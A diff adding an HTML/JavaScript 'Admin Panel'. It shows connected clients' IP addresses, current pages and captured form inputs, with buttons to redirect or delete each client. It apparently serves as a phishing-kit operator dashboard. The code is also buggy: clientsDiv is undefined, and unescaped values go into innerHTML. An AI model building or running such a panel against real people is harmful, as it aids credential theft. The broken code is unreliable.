@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Admin Panel</title>
+  <style>
+    .client {
+      border: 1px solid #ccc;
+      padding: 10px;
+      margin: 10px 0;
+    }
+    .client h3 {
+      margin: 0;
+    }
+    .inputs {
+      display: none;
+      margin-top: 10px;
+    }
+    .container {
+            display: flex;
+            align-items: center;
+            border: 1px solid black;
+            border-radius: 2px;
+            padding: 5px;
+            width: 10%;
+            white-space: nowrap;
+            margin-left:20px;
+        }
+
+        .circle {
+            width: 7px;
+            height: 7px;
+            background-color: green;
+            border-radius: 50%;
+            margin-right: 5px;
+        }
+  </style>
+</head>
+<body>
+  <h1>Admin Panel</h1>
+  <div id="clients"></div>
+ 
+  <script>
+   function updateCurrPage(currPage) {
+    const currPageDivs = document.querySelectorAll('.currPage');
+    currPageDivs.forEach(div => {
+      div.textContent = currPage;
+    });
+  }
+
+  // Modified updateClients function to include the currPage update
+  function updateClients(clientList) {
+    clientsDiv.innerHTML = '';
+    clientList.forEach(client => {
+      const clientDiv = document.createElement('div');
+      clientDiv.classList.add('client');
+      const inputsHtml = Object.entries(client.inputs).map(([key, value]) => `<p>${key}: ${value}</p>`).join('');
+      clientDiv.innerHTML = `
+        <div style="display:flex; align-items:center;">
+          <h3 style="margin-right: 10px;">Client: ${client.clientId} IP: ${client.ip}</h3>
+          <div class="container">
+            <div class="circle"></div>
+            <div id="currPage-${client.clientId}" class="currPage"></div>
+          </div>
+        </div>
+        <button onclick="sendCommand('${client.clientId}', 'redirect1')">Redirect 1</button>
+        <button onclick="sendCommand('${client.clientId}', 'redirect2')">Redirect 2</button>
+        <button onclick="viewInputs('${client.clientId}')">View Inputs</button>
+        <button onclick="deleteClient('${client.clientId}')">Delete</button>
+        <div id="inputs-${client.clientId}" class="inputs">
+          <h4>Inputs:</h4>
+          ${inputsHtml}
+        </div>
+      `;
+      clientsDiv.appendChild(clientDiv);
+        updateCurrPage(client.clientId, client.currPage);
+    });
+  }
+    
+    async function sendCommand(clientId, command) {
+      try {
+        const response = await fetch('/send-command', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({ clientId, command })
+        });
+        if (!response.ok) {
+          alert('Failed to send command');
+        }
+      } catch (error) {
+        console.error('Error sending command:', error);
+        alert('Error sending command');
+      }
+    }
+
+    function viewInputs(clientId) {
+      const inputsDiv = document.getElementById(`inputs-${clientId}`);
+      inputsDiv.style.display = inputsDiv.style.display === 'none' ? 'block' : 'none';
+    }
+
+    async function deleteClient(clientId) {
+      try {
+        const response = await fetch('/delete-client', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({ clientId })
+        });
+        if (!response.ok) {
+          alert('Failed to delete client');
+        }
+      } catch (error) {
+        console.error('Error deleting client:', error);
+        alert('Error deleting client');
+      }
+    }
+
+    const eventSource = new EventSource('/events?admin=true');
+    eventSource.onmessage = function(event) {
+      const data = JSON.parse(event.data);
+      if (data.type === 'adminUpdate') {
+        updateClients(data.clientList);
+        updateCurrPage(data.currPage);
+      }
+    };
+
+    eventSource.onerror = function(error) {
+      console.error('EventSource failed:', error);
+    };
+
+    // Load initial clients data if needed
+    async function loadInitialClients() {
+      try {
+        const response = await fetch('/events?admin=true');
+        const data = await response.json();
+        updateClients(data.clientList);
+      } catch (error) {
+        console.error('Error loading initial clients:', error);
+      }
+    }
+
+    loadInitialClients();
+  </script>
+</body>
+</html> 
